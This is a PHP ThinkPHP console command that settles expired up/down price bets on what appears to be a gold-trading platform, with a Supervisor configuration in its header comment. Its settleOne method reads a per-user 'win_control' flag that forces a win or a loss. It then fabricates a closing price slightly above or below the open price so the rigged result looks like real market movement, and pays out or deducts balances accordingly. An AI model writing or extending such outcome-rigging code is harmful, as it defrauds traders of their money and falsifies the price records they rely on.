<?php

namespace app\admin\command;

use app\common\model\Order;
use app\common\model\Product;
use app\common\model\User;
use app\common\model\UserAccount;
use think\console\Command;
use think\console\Input;
use think\console\Output;
use think\Db;
use think\Log;

/**
 * 订单自动结算定时任务
 * 用法: php think settle_order
 * 支持输赢控制，逻辑对齐旧项目
 *
 * Supervisor 配置（宝塔面板）:
 * [program:sg_settle_order]
 * command=php think settle_order
 * directory=/www/wwwroot/shgolddata-Backend/
 * autorestart=true
 * startsecs=0
 * startretries=3
 * stdout_logfile=/www/server/panel/plugin/supervisor/log/sg_settle_order.out.log
 * stderr_logfile=/www/server/panel/plugin/supervisor/log/sg_settle_order.err.log
 * stdout_logfile_maxbytes=2MB
 * stderr_logfile_maxbytes=2MB
 * user=root
 * priority=999
 * numprocs=1
 * process_name=%(program_name)s_%(process_num)02d
 *
 * 注意: startsecs 必须设为 0，因为进程每次执行完会正常退出，由 autorestart 自动重启
 */
class SettleOrder extends Command
{
    protected function configure()
    {
        $this->setName('settle_order')->setDescription('Settle expired orders (single run)');
    }

    protected function execute(Input $input, Output $output)
    {
        $this->output = $output;

        $output->info('========================================');
        $output->info('订单自动结算任务启动');
        $output->info('启动时间: ' . date('Y-m-d H:i:s'));
        $output->info('进程 PID: ' . getmypid());
        $output->info('========================================');

        try {
            $this->settleOnce($output);
        } catch (\Exception $e) {
            Log::error('settle_order error: ' . $e->getMessage());
            $output->error('❌ 执行异常: ' . $e->getMessage());
        }

        $output->info('本轮执行完成，1秒后重启...');
        // 等待1秒后退出，由 Supervisor autorestart 自动重启实现持续轮询
        sleep(1);
    }

    /**
     * 单次轮询结算
     */
    protected function settleOnce(Output $output)
    {
        $now = time();
        $output->writeln('');
        $output->comment('⏰ ' . date('Y-m-d H:i:s') . ' 开始扫描待结算订单...');
        
        $orders = Order::where('status', 0)
            ->where('settle_time', '<=', $now)
            ->limit(100)
            ->select();
        
        $count = $orders ? count($orders) : 0;
        $output->info("📋 查询到 {$count} 笔待结算订单");
        
        if (!$orders || $count == 0) {
            $output->comment('💤 暂无待结算订单，等待下次扫描...');
            return;
        }
        
        $settled = 0;
        $failed = 0;
        foreach ($orders as $order) {
            try {
                $this->settleOne($order);
                $settled++;
                $output->info("  ✓ {$order->order_no} 结算成功");
            } catch (\Exception $e) {
                $failed++;
                Log::error("settle {$order->order_no}: " . $e->getMessage());
                $output->error("  ✗ {$order->order_no} 失败: " . $e->getMessage());
            }
        }
        
        $output->info('----------------------------------------');
        $output->info("📊 本轮结算统计: 成功 {$settled} 笔 | 失败 {$failed} 笔");
        $output->info('----------------------------------------');
    }

    /**
     * 结算单个订单
     */
    protected $output;

    protected function settleOne($order)
    {
        $product = Product::get($order->product_id);
        if (!$product) {
            throw new \Exception('Product not found');
        }

        $closePrice  = $product->price;
        $openPrice   = $order->open_price;
        $tradeAmount = $order->trade_amount;
        $odds        = $order->odds / 100; // 收益率转小数
        $direction   = $order->direction;  // 0=买涨 1=买跌
        $userId      = $order->user_id;

        // 获取用户输赢控制
        $user = User::get($userId);
        $winControl = $user ? intval($user->win_control) : 0;
        $balanceBefore = $user ? $user->money : 0;

        $this->log("[订单 {$order->order_no}] 用户:{$userId} 方向:" . ($direction == 0 ? '买涨' : '买跌')
            . " 本金:{$tradeAmount} 赔率:{$order->odds}% 开仓价:{$openPrice} 结算价:{$closePrice}"
            . " 余额:{$balanceBefore} 输赢控制:{$winControl}");

        // 判断涨跌结果: 1=赢 0=平 -1=输
        if ($direction == 0) {
            $result = $closePrice > $openPrice ? 1 : ($closePrice == $openPrice ? 0 : -1);
        } else {
            $result = $closePrice < $openPrice ? 1 : ($closePrice == $openPrice ? 0 : -1);
        }

        // 输赢控制：强制修改结果和结算价格
        if ($winControl == 1) {
            // 必赢：调整结算价确保赢
            $result = 1;
            $randomRate = mt_rand(2, 8) / 10000; // 0.02%-0.08%
            if ($direction == 0) {
                $closePrice = $openPrice + ($openPrice * $randomRate);
                if ($closePrice <= $openPrice) {
                    $closePrice = $openPrice + ($openPrice * 0.0002);
                }
            } else {
                $closePrice = $openPrice - ($openPrice * $randomRate);
                if ($closePrice >= $openPrice) {
                    $closePrice = $openPrice - ($openPrice * 0.0002);
                }
            }
        } elseif ($winControl == 2) {
            // 必输：调整结算价确保输
            $result = -1;
            $randomRate = mt_rand(2, 8) / 10000;
            if ($direction == 0) {
                $closePrice = $openPrice - ($openPrice * $randomRate);
                if ($closePrice >= $openPrice) {
                    $closePrice = $openPrice - ($openPrice * 0.0002);
                }
            } else {
                $closePrice = $openPrice + ($openPrice * $randomRate);
                if ($closePrice <= $openPrice) {
                    $closePrice = $openPrice + ($openPrice * 0.0002);
                }
            }
        }

        $resultMap = [1 => '赢', 0 => '平', -1 => '输'];
        $this->log("  判定结果: {$resultMap[$result]}" . ($winControl ? "（受控）" : ''));

        // 计算盈亏和返还金额
        if ($result == 1) {
            // 赢：盈利 = 本金 × 收益率，返还 = 本金 + 盈利
            $profit = round($tradeAmount * $odds, 2);
            $returnAmount = $tradeAmount + $profit;
            $orderResult = 1;
            $note = '交易盈利结算';
        } elseif ($result == 0) {
            // 平局：退还本金
            $profit = 0;
            $returnAmount = $tradeAmount;
            $orderResult = 2;
            $note = '交易平局退还';
        } else {
            // 输：亏损 = 本金 × 收益率，返还 = 本金 - 亏损
            $loss = round($tradeAmount * $odds, 2);
            $profit = -$loss;
            $returnAmount = $tradeAmount - $loss;
            $orderResult = 0;
            $note = '交易亏损结算';
        }

        $resultLabel = ['亏损', '盈利', '平局'];
        $this->log("  结算: {$resultLabel[$orderResult]} | 盈亏:{$profit} | 返还:{$returnAmount}");

        $now = time();
        Db::startTrans();
        try {
            // 更新订单
            $order->save([
                'close_price' => round($closePrice, 6),
                'profit'      => $profit,
                'status'      => 1,
                'result'      => $orderResult,
                'close_time'  => $now,
            ]);
            // 返还资金（赢返本金+盈利，平退本金，输返本金-亏损）
            if ($returnAmount > 0) {
                $ret = UserAccount::changeBalance($userId, $returnAmount, 4, $order->order_no, $note);
                if (!$ret) {
                    throw new \Exception('Return balance failed');
                }
            }
            // 更新统计
            $account = UserAccount::where('user_id', $userId)->find();
            if ($account) {
                $profitBefore = $account->total_profit;
                $lossBefore = $account->total_loss;
                if ($orderResult == 1 && $profit > 0) {
                    $this->log("  >> 进入盈利统计: total_profit += {$profit}");
                    $account->total_profit = function_exists('bcadd')
                        ? bcadd($account->total_profit, $profit, 2)
                        : $account->total_profit + $profit;
                } elseif ($orderResult == 0) {
                    $this->log("  >> 进入亏损统计: total_loss += " . abs($profit));
                    $account->total_loss = function_exists('bcadd')
                        ? bcadd($account->total_loss, abs($profit), 2)
                        : $account->total_loss + abs($profit);
                } else {
                    $this->log("  >> 平局，不更新统计 (orderResult={$orderResult})");
                }
                $account->save();
                $this->log("  统计: 累计盈利 {$profitBefore} -> {$account->total_profit} | 累计亏损 {$lossBefore} -> {$account->total_loss}");
            }
            // 查询结算后余额
            $userAfter = User::get($userId);
            $balanceAfter = $userAfter ? $userAfter->money : 0;
            $this->log("  资金: 余额 {$balanceBefore} -> {$balanceAfter} (变动: " . round($balanceAfter - $balanceBefore, 2) . ")");
            Db::commit();
        } catch (\Exception $e) {
            Db::rollback();
            throw $e;
        }
    }

    protected function log($msg)
    {
        if ($this->output) {
            $this->output->writeln(date('H:i:s') . ' ' . $msg);
        }
        Log::info($msg);
    }
}
